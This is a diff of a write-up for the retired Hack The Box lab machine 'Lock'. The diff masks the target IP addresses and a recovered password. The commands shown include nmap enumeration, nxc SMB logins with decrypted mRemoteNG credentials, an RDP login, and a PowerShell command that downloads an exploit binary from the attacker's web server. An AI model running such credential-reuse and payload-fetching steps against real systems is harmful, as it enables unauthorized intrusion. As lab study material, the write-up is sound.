@@ -15,9 +15,9 @@ Author: [xct](https://app.hackthebox.com/users/13569) and [kozmer](https://app.h
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.196.71
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 10:04 EDT
-Nmap scan report for 10.129.196.71
+Nmap scan report for 10.129.xx.xx
 Host is up (0.46s latency).
 Not shown: 996 filtered tcp ports (no-response)
 PORT     STATE SERVICE       VERSION
@@ -121,7 +121,7 @@ Nmap done: 1 IP address (1 host up) scanned in 161.66 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.196.71     lock.htb
+10.129.xx.xx     lock.htb
 ```
 
 We got 2 http services, let's check them out.
@@ -439,27 +439,27 @@ Searching and found out [mRemoteNG_password_decrypt](https://github.com/gquere/m
 Name: RDP/Gale
 Hostname: Lock
 Username: Gale.Dekarios
-Password: ty8wnW9qCKDosXo6
+Password: ty8wnW9qCKDosxxx
 ```
 
 We got the password, let's verify it.
 
 ```bash
-└─$ sudo nxc smb 10.129.196.71 -u gale.dekarios -p 'ty8wnW9qCKDosXo6' --users         
-SMB         10.129.196.71   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:False) 
-SMB         10.129.196.71   445    LOCK             [+] Lock\gale.dekarios:ty8wnW9qCKDosXo6
+└─$ sudo nxc smb 10.129.xx.xx -u gale.dekarios -p 'ty8wnW9qCKDosxxx' --users         
+SMB         10.129.xx.xx   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:False) 
+SMB         10.129.xx.xx   445    LOCK             [+] Lock\gale.dekarios:ty8wnW9qCKDosxxx
 ```
 
 ```bash
-└─$ sudo nxc smb 10.129.196.71 -u gale.dekarios -p 'ty8wnW9qCKDosXo6' --shares        
-SMB         10.129.196.71   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:False) 
-SMB         10.129.196.71   445    LOCK             [+] Lock\gale.dekarios:ty8wnW9qCKDosXo6 
-SMB         10.129.196.71   445    LOCK             [*] Enumerated shares
-SMB         10.129.196.71   445    LOCK             Share           Permissions     Remark
-SMB         10.129.196.71   445    LOCK             -----           -----------     ------
-SMB         10.129.196.71   445    LOCK             ADMIN$                          Remote Admin
-SMB         10.129.196.71   445    LOCK             C$                              Default share
-SMB         10.129.196.71   445    LOCK             IPC$            READ            Remote IPC
+└─$ sudo nxc smb 10.129.xx.xx -u gale.dekarios -p 'ty8wnW9qCKDosxxx' --shares        
+SMB         10.129.xx.xx   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:False) 
+SMB         10.129.xx.xx   445    LOCK             [+] Lock\gale.dekarios:ty8wnW9qCKDosxxx 
+SMB         10.129.xx.xx   445    LOCK             [*] Enumerated shares
+SMB         10.129.xx.xx   445    LOCK             Share           Permissions     Remark
+SMB         10.129.xx.xx   445    LOCK             -----           -----------     ------
+SMB         10.129.xx.xx   445    LOCK             ADMIN$                          Remote Admin
+SMB         10.129.xx.xx   445    LOCK             C$                              Default share
+SMB         10.129.xx.xx   445    LOCK             IPC$            READ            Remote IPC
 ```
 
 All good but seems like we can not do anything with `smb` and even can not `evil-winrm` to access this machine. <br>
@@ -469,7 +469,7 @@ All good but seems like we can not do anything with `smb` and even can not `evil
 Let's try to connect to the user `gale.dekarios` with RDP.
 
 ```bash
-└─$ rdesktop -u 'gale.dekarios' -p 'ty8wnW9qCKDosXo6' 10.129.196.71:3389
+└─$ rdesktop -u 'gale.dekarios' -p 'ty8wnW9qCKDosxxx' 10.129.xx.xx:3389
 ```
 
 ![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-18.png)
@@ -563,7 +563,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
 ```cmd
-powershell -Command "Invoke-WebRequest -Uri 'http://10.10.16.36/SetOpLock.exe' -OutFile 'SetOpLock.exe'"
+powershell -Command "Invoke-WebRequest -Uri 'http://10.xx.xx.xx/SetOpLock.exe' -OutFile 'SetOpLock.exe'"
 ```
 
 ![Lock Website](/assets/img/lock-htb-retired-machine/lock-htb-retired-machine_website-24.png)
@@ -571,7 +571,7 @@ powershell -Command "Invoke-WebRequest -Uri 'http://10.10.16.36/SetOpLock.exe' -
 ```bash
 └─$ python3 -m http.server 80                                                                              
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.129.196.71 - - [21/Aug/2025 22:48:02] "GET /SetOpLock.exe HTTP/1.1" 200 -
+10.129.xx.xx - - [21/Aug/2025 22:48:02] "GET /SetOpLock.exe HTTP/1.1" 200 -
 ```
 
 Confirm that the file is downloaded.
